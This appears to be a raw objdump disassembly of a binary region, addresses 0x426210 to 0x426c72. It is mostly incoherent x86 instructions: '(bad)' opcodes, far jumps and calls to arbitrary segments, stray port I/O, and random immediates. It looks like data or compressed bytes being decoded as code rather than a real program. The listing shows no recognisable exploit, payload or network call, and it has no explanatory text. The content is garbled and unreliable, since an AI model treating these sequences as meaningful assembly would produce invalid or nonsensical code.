  426210:	cmp    al,0xdd
  426212:	ss mov ebp,0xd72b47b4
  426218:	xor    DWORD PTR [esi+0x64],esp
  42621b:	push   0x24
  42621d:	jp     0x4261c7
  42621f:	imul   eax,DWORD PTR [esi],0xffffffb6
  426222:	xlat   BYTE PTR ds:[ebx]
  426223:	fldcw  WORD PTR [edx-0x16321bfb]
  426229:	dec    edi
  42622a:	(bad)  
  42622b:	pop    ss
  42622c:	aas    
  42622d:	xchg   esp,eax
  42622e:	sub    eax,0xb1e0fb78
  426233:	cmp    cl,bl
  426235:	or     BYTE PTR [ebp-0x49],cl
  426238:	in     al,0x17
  42623a:	mov    al,0x59
  42623c:	mov    edx,0x609946ed
  426241:	scas   eax,DWORD PTR es:[edi]
  426242:	jle    0x426204
  426244:	mov    bh,0x23
  426246:	(bad)  
  426247:	push   ecx
  426248:	retf   0x2622
  42624b:	xlat   BYTE PTR ds:[ebx]
  42624c:	inc    ebx
  42624d:	mov    ebx,0xfce371a4
  426252:	call   0xc0c3:0x494675d5
  426259:	push   ecx
  42625a:	into   
  42625b:	in     eax,dx
  42625c:	imul   ebx,eax,0xffffffdd
  42625f:	sub    cl,BYTE PTR [ebp+0x78]
  426262:	pusha  
  426263:	lds    ecx,FWORD PTR [eax-0x24]
  426266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426267:	pop    es
  426268:	mov    WORD PTR [esi+0x7ffef47f],es
  42626e:	push   eax
  42626f:	stos   DWORD PTR es:[edi],eax
  426270:	jno    0x426255
  426272:	xchg   ecx,eax
  426273:	push   edx
  426274:	cmp    ecx,DWORD PTR [ebx-0x47]
  426277:	out    dx,eax
  426278:	daa    
  426279:	sti    
  42627a:	jmp    0xb90c:0x8423bcf
  426281:	push   esi
  426282:	mov    bl,0x44
  426284:	in     eax,dx
  426285:	push   ebp
  426286:	xchg   DWORD PTR [eax+0x6d],ecx
  426289:	add    eax,0x82caed76
  42628e:	xor    eax,0x4c847c4a
  426293:	mov    al,ds:0x9eec2522
  426298:	dec    ecx
  426299:	(bad)  
  42629a:	inc    edx
  42629b:	loope  0x4262b4
  42629d:	div    BYTE PTR [edx-0x2f9bd44c]
  4262a3:	dec    edx
  4262a4:	jno    0x426234
  4262a6:	sahf   
  4262a7:	sub    ch,dh
  4262a9:	xor    DWORD PTR [ebx+eax*2+0x7],0xa6d43e61
  4262b1:	aam    0xed
  4262b3:	rcr    DWORD PTR [esi-0x12],0x9d
  4262b7:	je     0x4262ba
  4262b9:	mov    ecx,0xb8e93ca9
  4262be:	cmp    al,0x3b
  4262c0:	inc    edi
  4262c1:	sbb    eax,0x5006ae11
  4262c6:	(bad)  
  4262c7:	imul   BYTE PTR ds:0xa34d9863
  4262cd:	addr16 out dx,al
  4262cf:	jecxz  0x426267
  4262d1:	mul    ebp
  4262d3:	push   esp
  4262d4:	inc    ebx
  4262d5:	mul    edx
  4262d7:	and    BYTE PTR fs:[edi+0x5d],ch
  4262db:	mov    al,0xf9
  4262dd:	mov    ds:0x6f4d5d41,al
  4262e2:	fcom   QWORD PTR [ebp+edx*8+0x2a]
  4262e6:	out    0xb4,al
  4262e8:	cli    
  4262e9:	xchg   ebp,eax
  4262ea:	data16 mov dl,0xca
  4262ed:	xor    BYTE PTR [ecx+0x5de89b4c],cl
  4262f3:	jnp    0x42627a
  4262f5:	js     0x42633a
  4262f7:	pop    ecx
  4262f8:	repz push esp
  4262fa:	dec    DWORD PTR [edi+0x24]
  4262fd:	jl     0x426339
  4262ff:	adc    BYTE PTR [esi],cl
  426301:	dec    ebx
  426302:	aaa    
  426303:	dec    BYTE PTR [ecx]
  426305:	sbb    al,0xb9
  426307:	les    esp,FWORD PTR [ebp+0x3a]
  42630a:	lods   eax,DWORD PTR ds:[esi]
  42630b:	inc    dl
  42630d:	and    eax,ebx
  42630f:	xchg   edi,eax
  426310:	stos   DWORD PTR es:[edi],eax
	...
  426371:	add    BYTE PTR [eax],al
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x49c08afb
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xd4000001
  42638d:	jno    0x426392
  42638f:	dec    ebp
  426390:	sub    DWORD PTR [ebp+0x286303bb],ecx
  426396:	call   0xbe5e33d2
  42639b:	inc    esi
  42639c:	shl    DWORD PTR [eax],0x1b
  42639f:	ds sahf 
  4263a1:	xchg   DWORD PTR [edx+0x76],esi
  4263a4:	lea    ebp,[edx]
  4263a6:	push   ss
  4263a7:	mov    edi,DWORD PTR ds:0x1dc585fb
  4263ad:	mov    DWORD PTR [ebx+0x68],ebx
  4263b0:	xchg   BYTE PTR [eax+0x7c318fde],bh
  4263b6:	mov    fs,WORD PTR [esi+0x5b]
  4263b9:	or     al,0x4a
  4263bb:	sbb    DWORD PTR [edx-0x3e0bcad5],0x502aaee2
  4263c5:	xchg   DWORD PTR [eax-0x6f29a87],ebp
  4263cb:	mov    WORD PTR [edx],fs
  4263cd:	cmp    eax,0x9308ca50
  4263d2:	jae    0x426450
  4263d4:	cli    
  4263d5:	stos   BYTE PTR es:[edi],al
  4263d6:	cs loope 0x426396
  4263d9:	push   cs
  4263da:	ins    DWORD PTR es:[edi],dx
  4263db:	data16 xor ah,dl
  4263de:	cli    
  4263df:	test   BYTE PTR [eax+0x48],dh
  4263e2:	in     al,0xa6
  4263e4:	int3   
  4263e5:	pusha  
  4263e6:	jl     0x42640b
  4263e8:	adc    al,BYTE PTR [edi-0x34daf097]
  4263ee:	lahf   
  4263ef:	psubd  mm0,QWORD PTR [esp+eax*1+0x64]
  4263f4:	jnp    0x42640a
  4263f6:	ss pop ebx
  4263f8:	mov    ch,0xcb
  4263fa:	shl    DWORD PTR [esi+ecx*8+0x6c4be8ee],0x6b
  426402:	das    
  426403:	jle    0x42638b
  426405:	or     BYTE PTR [eax-0x13457098],0x79
  42640c:	arpl   WORD PTR [eax],bx
  42640e:	jg     0x4263d4
  426410:	hlt    
  426411:	jno    0x42640f
  426413:	or     BYTE PTR [edx+0x7a],ah
  426416:	jle    0x4263ee
  426418:	ins    BYTE PTR es:[edi],dx
  426419:	and    eax,0x8c19627
  42641e:	in     eax,0x7b
  426420:	adc    eax,0x89ddc9
  426425:	dec    edi
  426426:	sbb    edx,DWORD PTR [ecx-0x3f426481]
  42642c:	or     al,0x92
  42642e:	les    ebp,FWORD PTR [esp+ebp*8]
  426431:	fisubr DWORD PTR [edx-0x3af0b4da]
  426437:	nop
  426438:	push   ss
  426439:	fwait
  42643a:	lds    ebp,FWORD PTR [ecx]
  42643c:	xchg   BYTE PTR [ebx],al
  42643e:	mov    BYTE PTR [ebp+ebp*1-0x3],bl
  426442:	inc    eax
  426443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426444:	test   eax,0xc61702d1
  426449:	inc    edi
  42644a:	ss push 0xffffffde
  42644d:	sar    BYTE PTR [edi+0x2c06de88],cl
  426453:	xor    edi,DWORD PTR [esp+ecx*8+0x16810333]
  42645a:	xchg   bx,ax
  42645c:	mov    bl,0x56
  42645e:	push   esp
  42645f:	push   cs
  426460:	movups xmm5,XMMWORD PTR [edi+0x47fa03c8]
  426467:	sub    ebx,DWORD PTR [ebp+0x3a50f3d3]
  42646d:	out    dx,al
  42646e:	retf   0x8f77
  426471:	push   0xffffff97
  426473:	push   0xc7d8f4bd
  426478:	test   BYTE PTR [edx+ebx*8+0x1c],bl
  42647c:	add    eax,0xd1a63769
  426481:	cwde   
  426482:	xchg   BYTE PTR [ebp+ebp*8-0x4c],ch
  426486:	add    esp,eax
  426488:	popa   
  426489:	dec    ebp
  42648a:	pop    ebx
  42648b:	inc    ecx
  42648c:	imul   edi,esi,0xf14cfe
	...
  4264f2:	add    BYTE PTR [eax],al
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x640cb07b]
  426503:	ret    0x99b0
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0x71000001
  42650d:	lahf   
  42650e:	cmp    DWORD PTR [ecx],ebp
  426510:	adc    esp,ebp
  426512:	aam    0x32
  426514:	or     al,0x44
  426516:	ds and eax,0xb44fb36a
  42651c:	ficomp WORD PTR [esi]
  42651e:	fiadd  WORD PTR [edi+ecx*2]
  426521:	push   ss
  426522:	popf   
  426523:	bound  eax,QWORD PTR [ebx+0x37]
  426526:	fwait
  426527:	in     eax,dx
  426528:	in     al,dx
  426529:	mov    dh,0xb4
  42652b:	sbb    eax,0x3d18e447
  426530:	mov    al,ds:0xb00eb048
  426535:	sar    BYTE PTR [esi-0x47912341],1
  42653b:	cmp    DWORD PTR [ebx+0x2f796449],0x52caac2f
  426545:	in     eax,0xfc
  426547:	loop   0x4265bb
  426549:	jmp    0x2a4397ce
  42654e:	ret    0xb76b
  426551:	pop    ds
  426552:	lea    esi,[eax+0x4f]
  426555:	pop    esp
  426556:	inc    ebp
  426557:	mov    edi,0xfe62a790
  42655c:	fisubr WORD PTR [ebx]
  42655e:	pop    edx
  42655f:	into   
  426560:	push   eax
  426561:	sbb    ch,BYTE PTR [eax-0x6dc0492c]
  426567:	jmp    0x3f98:0x880306ac
  42656e:	fwait
  42656f:	addr16 xchg ebx,eax
  426571:	in     al,0x6f
  426573:	pop    esp
  426574:	fnstenv [eax]
  426576:	jo     0x4265af
  426578:	rcr    DWORD PTR [eax],cl
  42657a:	out    0x37,eax
  42657c:	cdq    
  42657d:	in     al,dx
  42657e:	scas   eax,DWORD PTR es:[edi]
  42657f:	je     0x426506
  426581:	xor    eax,0xd2141d1b
  426586:	add    al,0x22
  426588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426589:	sub    eax,0x7f769a1a
  42658e:	jecxz  0x426551
  426590:	mov    ebp,0x5c65fa15
  426595:	loope  0x4265a6
  426597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426598:	mov    ch,0x7f
  42659a:	add    BYTE PTR [ebp-0x7],ah
  42659d:	loope  0x4265a9
  42659f:	adc    BYTE PTR [ebx+0x2a],cl
  4265a2:	mov    esp,ecx
  4265a4:	daa    
  4265a5:	and    al,0x8f
  4265a7:	ja     0x42652c
  4265a9:	xchg   ebx,eax
  4265aa:	(bad)  
  4265ab:	ss mov dl,0x4
  4265ae:	mov    edi,0xa67225ac
  4265b3:	mov    BYTE PTR [edx-0x66],0x6f
  4265b7:	jmp    0xfc63cebc
  4265bc:	xchg   BYTE PTR [ebx+0x8],ah
  4265bf:	nop
  4265c0:	int3   
  4265c1:	das    
  4265c2:	retf   0xa07
  4265c5:	sub    ch,BYTE PTR ss:[eax-0x7dae5ecc]
  4265cc:	out    0x8c,eax
  4265ce:	mov    edx,0x9628a059
  4265d3:	push   eax
  4265d4:	es ds ret 
  4265d7:	lock ja 0x4265cd
  4265da:	ror    BYTE PTR gs:[edx],cl
  4265dd:	cmp    cl,BYTE PTR ds:[ecx+ebx*8]
  4265e1:	pop    eax
  4265e2:	or     al,0xe6
  4265e4:	adc    al,0xb2
  4265e6:	push   cs
  4265e7:	call   0x762a:0x14495e8f
  4265ee:	mov    ch,0xc7
  4265f0:	push   ecx
  4265f1:	jecxz  0x4265c4
  4265f3:	cmp    al,0x1
  4265f5:	pop    ebp
  4265f6:	push   ds
  4265f7:	xor    ecx,DWORD PTR [edi]
  4265f9:	sar    edi,1
  4265fb:	out    0xff,al
  4265fd:	sbb    eax,0x2cccb1da
  426602:	aaa    
  426603:	in     al,0x90
  426605:	xor    eax,0x395985a6
  42660a:	sub    ah,BYTE PTR [ecx+eax*8+0x73]
  42660e:	test   al,0xff
  426610:	fwait
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x58ca6da4]
  426682:	sbb    esp,esi
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0xb6000001
  42668d:	aas    
  42668e:	push   edx
  42668f:	inc    ecx
  426690:	pop    es
  426691:	pop    edx
  426692:	and    dh,BYTE PTR [ebp+0x27]
  426695:	nop
  426696:	ficomp WORD PTR [ebp+0xcc6836b]
  42669c:	test   BYTE PTR [edx+0x113c3e5f],ch
  4266a2:	push   ebp
  4266a3:	bound  edx,QWORD PTR [ebp-0x277ad6ca]
  4266a9:	stc    
  4266aa:	xor    dh,BYTE PTR [eax+ebx*8+0x6a]
  4266ae:	and    DWORD PTR [edx],0x6f
  4266b1:	adc    al,0xe1
  4266b3:	or     DWORD PTR [ebx],edi
  4266b5:	mov    bl,0x43
  4266b7:	push   ss
  4266b8:	or     cl,BYTE PTR [edx+0x715a957b]
  4266be:	adc    dl,ch
  4266c0:	inc    eax
  4266c1:	leave  
  4266c2:	fwait
  4266c3:	adc    al,0x51
  4266c5:	mov    bh,0xc1
  4266c7:	inc    esi
  4266c8:	fisubr WORD PTR [eax]
  4266ca:	fidivr DWORD PTR [ecx+ebp*4]
  4266cd:	loopne 0x426700
  4266cf:	cmp    DWORD PTR [eax],0xe2123d5e
  4266d5:	adc    eax,0xd7c56146
  4266da:	push   ebp
  4266db:	cmp    edi,DWORD PTR [edx-0x13]
  4266de:	sahf   
  4266df:	in     eax,0xe7
  4266e1:	jno    0x426706
  4266e3:	sub    eax,0x3c7a03f5
  4266e8:	out    0xd7,eax
  4266ea:	jle    0x42675b
  4266ec:	sbb    al,0xc7
  4266ee:	mov    eax,ds:0xb620cc87
  4266f3:	xor    eax,0x8c8ec533
  4266f8:	xor    al,0xac
  4266fa:	sub    al,0xc3
  4266fc:	adc    esi,ebx
  4266fe:	stos   BYTE PTR es:[edi],al
  4266ff:	jecxz  0x426705
  426701:	pop    ss
  426702:	ins    DWORD PTR es:[edi],dx
  426703:	aam    0xe2
  426705:	outs   dx,BYTE PTR ds:[esi]
  426706:	ret    0x5cda
  426709:	sbb    DWORD PTR [ebx],0xfffffff4
  42670c:	jge    0x426730
  42670e:	and    DWORD PTR [ebx-0x4d3ed457],esp
  426714:	cmp    al,0x39
  426716:	nop
  426717:	pop    eax
  426718:	inc    ebx
  426719:	adc    eax,0xa4f93bc6
  42671e:	out    0xfe,al
  426720:	adc    al,0xbf
  426722:	cmp    DWORD PTR [esp+esi*4-0x30b180f4],esi
  426729:	sbb    eax,0x6f757e5c
  42672e:	in     al,0x13
  426730:	mov    WORD PTR [esi+0x693c43d6],cs
  426736:	sar    edx,0x12
  426739:	repnz pop ss
  42673b:	mov    al,ds:0x9a60dbc8
  426740:	xchg   ecx,eax
  426741:	add    ebx,ebp
  426743:	js     0x426755
  426745:	js     0x426745
  426747:	sar    DWORD PTR [eax+0x1b],1
  42674a:	add    bl,bh
  42674c:	mov    ebx,0xc9249585
  426751:	add    dl,BYTE PTR ds:0xf31b26e7
  426757:	push   ebx
  426758:	jnp    0x42675d
  42675a:	push   ss
  42675b:	popa   
  42675c:	lock int3 
  42675e:	xchg   ebx,eax
  42675f:	xor    BYTE PTR [ecx-0x1e],0x3
  426763:	xadd   DWORD PTR [eax-0x17],edi
  426767:	js     0x42671b
  426769:	push   ss
  42676a:	fwait
  42676b:	das    
  42676c:	mov    bh,0x4
  42676e:	mov    bh,0x7a
  426770:	and    eax,0x98768e2c
  426775:	pop    es
  426776:	mov    esi,0x60e1358b
  42677b:	scas   al,BYTE PTR es:[edi]
  42677c:	loope  0x42677f
  42677e:	cwde   
  42677f:	xor    eax,0x2029f017
  426784:	addr16 push ecx
  426786:	pop    esi
  426787:	push   es
  426788:	add    BYTE PTR [edx+edx*2],dh
  42678b:	push   0x85ad01be
  426790:	or     BYTE PTR [eax],al
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	jne    0x4267b6
  426802:	jbe    0x426848
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    BYTE PTR [edx-0x4b],bh
  42680e:	lock out dx,eax
  426810:	push   cs
  426811:	rol    DWORD PTR [ebx],cl
  426813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426814:	fwait
  426815:	iret   
  426816:	jne    0x42681f
  426818:	cmp    BYTE PTR [ebx-0x38],al
  42681b:	pop    es
  42681c:	dec    edi
  42681d:	dec    edi
  42681e:	cmc    
  42681f:	cmp    BYTE PTR [ebx-0x1fef0190],ah
  426825:	xchg   ebp,eax
  426826:	(bad)  
  426827:	add    al,0x78
  426829:	or     dl,BYTE PTR [esi-0x49]
  42682c:	or     DWORD PTR [eax+0x16],0x3182b909
  426833:	std    
  426834:	add    bl,BYTE PTR [eax-0x6dc2a421]
  42683a:	jecxz  0x4267c5
  42683c:	mov    ?,WORD PTR cs:[eax+0x32]
  426840:	aas    
  426841:	or     BYTE PTR [edx],bh
  426843:	xor    cl,BYTE PTR ds:0x988501e7
  426849:	pop    ebp
  42684a:	pop    edi
  42684b:	hlt    
  42684c:	jbe    0x4267de
  42684e:	hlt    
  42684f:	je     0x4268a2
  426851:	fcom   QWORD PTR [eax]
  426853:	lods   al,BYTE PTR ds:[esi]
  426854:	mov    bl,0x95
  426856:	cmp    al,0x57
  426858:	xchg   edi,eax
  426859:	jmp    0xd7df:0x3e49a4f1
  426860:	push   cs
  426861:	and    al,0x86
  426863:	add    BYTE PTR fs:[ebp-0x4e5f0504],dl
  42686a:	scas   al,BYTE PTR es:[edi]
  42686b:	daa    
  42686c:	das    
  42686d:	rcr    DWORD PTR [eax],cl
  42686f:	pop    esi
  426870:	push   es
  426871:	cmp    esp,ebx
  426873:	mov    ds:0x32935666,eax
  426878:	sub    al,0xde
  42687a:	aad    0xc0
  42687c:	add    DWORD PTR [esi-0x6a],esp
  42687f:	inc    eax
  426880:	(bad)  
  426881:	dec    esp
  426882:	push   eax
  426883:	sub    eax,0xd97678ea
  426888:	inc    esp
  426889:	and    al,ah
  42688b:	ins    DWORD PTR es:[edi],dx
  42688c:	pop    es
  42688d:	xor    al,0xad
  42688f:	mov    WORD PTR [ecx],?
  426891:	add    al,0x0
  426893:	or     BYTE PTR [ecx-0x3937bb5f],0x88
  42689a:	fsub   st,st(7)
  42689c:	and    DWORD PTR [edx-0x11],edi
  42689f:	adc    ebp,DWORD PTR [edx]
  4268a1:	sahf   
  4268a2:	xchg   ebx,eax
  4268a3:	aas    
  4268a4:	or     al,0x3f
  4268a6:	bound  eax,QWORD PTR [edi]
  4268a8:	mov    ebp,0x7bf5d15a
  4268ad:	xor    ebp,ebp
  4268af:	or     al,0x73
  4268b1:	icebp  
  4268b2:	shr    DWORD PTR [ecx+0x7f],cl
  4268b5:	mov    ch,0x65
  4268b7:	out    0x7b,eax
  4268b9:	xchg   edi,eax
  4268ba:	jns    0x426850
  4268bc:	pop    ebx
  4268bd:	pop    edx
  4268be:	jns    0x42690f
  4268c0:	(bad)  
  4268c1:	test   DWORD PTR [edx-0x47],0x36426a1d
  4268c8:	mov    bl,0x2b
  4268ca:	dec    eax
  4268cb:	cmp    al,0xff
  4268cd:	sbb    dh,BYTE PTR [esi+0x4ab9318f]
  4268d3:	add    eax,0x3db40fe7
  4268d8:	sbb    al,BYTE PTR [ebp-0x7b]
  4268db:	fwait
  4268dc:	jge    0x4268cd
  4268de:	and    al,0xd5
  4268e0:	or     BYTE PTR [eax-0x7c642661],dl
  4268e6:	fisubr DWORD PTR [ebx+0x50]
  4268e9:	sbb    esi,DWORD PTR [ebp+0x3b]
  4268ec:	cmp    ah,al
  4268ee:	cmc    
  4268ef:	inc    ebp
  4268f0:	jge    0x426955
  4268f2:	cmp    esi,ebp
  4268f4:	inc    ecx
  4268f5:	fild   QWORD PTR [eax-0x54]
  4268f8:	xor    al,0x43
  4268fa:	dec    esi
  4268fb:	and    BYTE PTR [edx+0x62845e2b],ch
  426901:	test   al,0x27
  426903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426904:	add    ah,BYTE PTR [eax]
  426906:	mov    BYTE PTR [esi],0xd0
  426909:	push   ds
  42690a:	jne    0x4268b3
  42690c:	dec    esi
  42690d:	and    BYTE PTR [ecx],ah
  42690f:	sub    DWORD PTR [ebp+0x0],ebx
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ecx,DWORD PTR [edi+esi*8]
  426982:	test   DWORD PTR [edi+0x19cbf],edx
  426988:	add    eax,0x60000001
  42698d:	dec    eax
  42698e:	std    
  42698f:	data16 mov al,0x23
  426992:	dec    ebp
  426993:	hlt    
  426994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426995:	(bad)  
  426996:	push   esi
  426997:	push   esi
  426998:	adc    BYTE PTR [edx],dl
  42699a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42699b:	cwde   
  42699c:	scas   al,BYTE PTR es:[edi]
  42699d:	scas   eax,DWORD PTR es:[edi]
  42699e:	xor    al,0x8e
  4269a0:	aad    0x7c
  4269a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269a3:	test   DWORD PTR ds:0xd33edb30,ebx
  4269a9:	(bad)  
  4269aa:	cwd    
  4269ac:	imul   edi,DWORD PTR [esp+ecx*8+0x47836838],0x5a
  4269b4:	pop    ecx
  4269b5:	aam    0xc5
  4269b7:	dec    esp
  4269b8:	xchg   esp,esi
  4269ba:	push   0x5b75d70d
  4269bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269c0:	ret    0x2730
  4269c3:	mov    al,ds:0x43ad265d
  4269c8:	ins    BYTE PTR es:[edi],dx
  4269c9:	in     al,dx
  4269ca:	dec    edi
  4269cb:	inc    esp
  4269cc:	cmp    DWORD PTR [ebx+0x7b86c9f7],esi
  4269d2:	add    eax,0xdd61c823
  4269d7:	sbb    al,al
  4269d9:	adc    cl,BYTE PTR [edx]
  4269db:	lahf   
  4269dc:	mov    ah,0x23
  4269de:	jnp    0x426a47
  4269e0:	jp     0x426a4f
  4269e2:	sbb    al,0xed
  4269e4:	dec    esp
  4269e5:	jne    0x4269e6
  4269e7:	xchg   esp,eax
  4269e8:	cmp    DWORD PTR [ebp+0x1d],0x8cee6e21
  4269ef:	jbe    0x42697c
  4269f1:	cmp    eax,0xd371e3ba
  4269f6:	or     dh,bl
  4269f8:	xor    DWORD PTR ds:0x80130956,0xe93d2067
  426a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a03:	stc    
  426a04:	pop    edi
  426a05:	mov    edi,0x7c23b6f3
  426a0a:	mov    eax,ds:0x269bcb0b
  426a0f:	sub    al,0xb3
  426a11:	clc    
  426a12:	dec    esi
  426a13:	add    dl,BYTE PTR [ebx+0xdee6d6a]
  426a19:	inc    eax
  426a1a:	or     esp,ecx
  426a1c:	and    dh,BYTE PTR [ebx]
  426a1e:	add    eax,0x798530d4
  426a23:	mov    bl,0x4c
  426a25:	mov    al,ds:0x7d4c1ddb
  426a2a:	add    eax,0x9d8ea76a
  426a2f:	jns    0x4269b4
  426a31:	adc    edx,DWORD PTR [esi+eiz*2]
  426a34:	lahf   
  426a35:	or     BYTE PTR [ebx-0x6d],ch
  426a38:	lock ficom DWORD PTR [edi+0x197e946]
  426a3f:	sbb    dl,BYTE PTR [ebp-0x34708e73]
  426a45:	icebp  
  426a46:	outs   dx,DWORD PTR ds:[esi]
  426a47:	in     al,dx
  426a48:	bound  edi,QWORD PTR [esp+esi*8+0x7c]
  426a4c:	mov    WORD PTR [edi-0x7],?
  426a4f:	pop    ecx
  426a50:	mov    cl,0xe2
  426a52:	not    BYTE PTR [ecx+0x7a54dccd]
  426a58:	in     eax,0xd
  426a5a:	lahf   
  426a5b:	in     eax,dx
  426a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a5d:	jl     0x426a89
  426a5f:	(bad)  
  426a60:	addr16 ror eax,cl
  426a63:	fbld   TBYTE PTR [edx]
  426a65:	sub    DWORD PTR [edi+0x79e37d7f],ebx
  426a6b:	pop    esi
  426a6c:	mov    DWORD PTR [edx+0x60],ecx
  426a6f:	xchg   edx,eax
  426a70:	pop    ebp
  426a71:	cmp    bh,BYTE PTR [ecx-0x5fef786a]
  426a77:	lds    edi,FWORD PTR [eax+0x146f2baf]
  426a7d:	and    DWORD PTR [edx],ecx
  426a7f:	mov    ebx,0x730fda98
  426a84:	pop    ebp
  426a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a86:	inc    edi
  426a87:	add    dh,bl
  426a89:	push   0x8cb23574
  426a8e:	pop    ecx
  426a8f:	sti    
  426a90:	out    0x0,al
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x89
  426b01:	dec    ecx
  426b02:	imul   BYTE PTR [edx+0x19dc4]
  426b08:	add    eax,0xb8000001
  426b0d:	div    BYTE PTR [edi+0x52]
  426b10:	fist   DWORD PTR [esi]
  426b12:	imul   ebx,DWORD PTR [edx+0x36],0xfffffff0
  426b16:	fld    QWORD PTR [edi]
  426b18:	fstp   DWORD PTR [ebp*4-0x704024c5]
  426b1f:	dec    eax
  426b20:	iret   
  426b21:	pop    ebp
  426b22:	out    dx,al
  426b23:	test   dl,0x6f
  426b26:	sti    
  426b27:	add    al,0x62
  426b29:	std    
  426b2a:	pop    ds
  426b2b:	(bad)  
  426b2c:	std    
  426b2d:	cmp    BYTE PTR [ebp+0x703f14b0],dl
  426b33:	sub    BYTE PTR [ecx-0xd],ah
  426b36:	push   cs
  426b37:	aas    
  426b38:	hlt    
  426b39:	add    DWORD PTR [eax],edx
  426b3b:	or     DWORD PTR [esi],0xffffffc2
  426b3e:	mov    WORD PTR [ecx+0x36ca474],?
  426b44:	pop    esi
  426b45:	sbb    DWORD PTR [ebp+0x6da60e64],edi
  426b4b:	cmp    al,0x8b
  426b4d:	bound  ebx,QWORD PTR [edi]
  426b4f:	or     edx,DWORD PTR [ebx]
  426b51:	lea    edx,ds:0xa2f4ee40
  426b57:	sub    BYTE PTR [eax-0x50fd0714],0xdd
  426b5e:	fdiv   st(5),st
  426b60:	into   
  426b61:	mov    dh,0x4e
  426b63:	jecxz  0x426bba
  426b65:	imul   ebx,DWORD PTR [edx+0x49e2bf53],0xffffff84
  426b6c:	push   edx
  426b6d:	jne    0x426b7c
  426b6f:	xlat   BYTE PTR ds:[ebx]
  426b70:	mov    ss,esp
  426b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b73:	xor    al,0x7d
  426b75:	push   0x30
  426b77:	jge    0x426b64
  426b79:	xchg   esi,eax
  426b7a:	mov    ds:0x2be825ff,al
  426b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b80:	sub    ebp,edi
  426b82:	ja     0x426bab
  426b84:	pushf  
  426b85:	std    
  426b86:	inc    edi
  426b87:	jecxz  0x426b19
  426b89:	mov    ch,0xac
  426b8b:	ror    DWORD PTR [edx],0xed
  426b8e:	inc    eax
  426b8f:	(bad)  
  426b90:	pop    ebx
  426b91:	mov    BYTE PTR [ebp-0x10],bh
  426b94:	xor    esp,DWORD PTR [eax-0x18]
  426b97:	add    BYTE PTR [ebx+esi*4],dh
  426b9a:	in     al,dx
  426b9b:	jecxz  0x426b9a
  426b9d:	pusha  
  426b9e:	addr16 fptan 
  426ba1:	cmp    BYTE PTR [esi],0x3a
  426ba4:	push   edx
  426ba5:	fsubr  st(0),st
  426ba7:	mov    edi,0x97373885
  426bac:	ftst   
  426bae:	sbb    eax,0xc58184ec
  426bb3:	xor    ebx,esi
  426bb5:	push   esi
  426bb6:	jns    0x426c0c
  426bb8:	fs sbb ebx,0x21
  426bbc:	fimul  DWORD PTR [ebx+0x10c89bfb]
  426bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bc3:	push   eax
  426bc4:	and    eax,0x9295e0fb
  426bc9:	out    dx,eax
  426bca:	(bad)  
  426bcb:	xor    esi,DWORD PTR [edi-0x53cc7522]
  426bd1:	aam    0x18
  426bd3:	mov    cl,0x32
  426bd5:	xchg   edi,eax
  426bd6:	mov    al,ds:0x78ee4072
  426bdb:	push   0xffffff93
  426bdd:	sub    BYTE PTR [edx-0x1],bl
  426be0:	fsubr  QWORD PTR [esi]
  426be2:	pop    es
  426be3:	jg     0x426b98
  426be5:	shl    edx,0xcd
  426be8:	pop    edx
  426be9:	stos   DWORD PTR es:[edi],eax
  426bea:	div    esi
  426bec:	addr16 or eax,0xaded066a
  426bf2:	add    ebp,DWORD PTR [eax-0x7e733d0]
  426bf8:	xor    al,0xf4
  426bfa:	call   0xbb4e:0x9de9c19d
  426c01:	xchg   BYTE PTR [ebp-0x31],ch
  426c04:	adc    al,0x16
  426c06:	xor    al,0x34
  426c08:	mov    ds:0xa1bc8759,al
  426c0d:	cdq    
  426c0e:	mov    ah,0xc8
  426c10:	inc    DWORD PTR [eax]
	...
  426c72:	add    BYTE PTR [eax],al
